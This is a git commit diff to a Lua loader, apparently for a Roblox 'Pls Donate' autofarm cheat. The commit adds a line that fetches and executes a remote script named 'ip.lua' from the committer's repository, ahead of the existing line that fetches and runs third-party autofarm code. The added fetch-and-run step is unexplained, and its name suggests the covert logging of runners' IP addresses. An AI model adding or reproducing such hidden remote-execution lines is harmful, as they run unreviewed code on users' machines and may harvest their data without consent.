ea6d78fcea7e4402549b40a6f58531050ea18b98
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-27 21:05:02 -0300

    Actualizar pls_donate.lua

--- pls_donate.lua
+++ pls_donate.lua
@@ -1,1 +1,5 @@
+_G.script_executed = "pls_donate.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua'))()
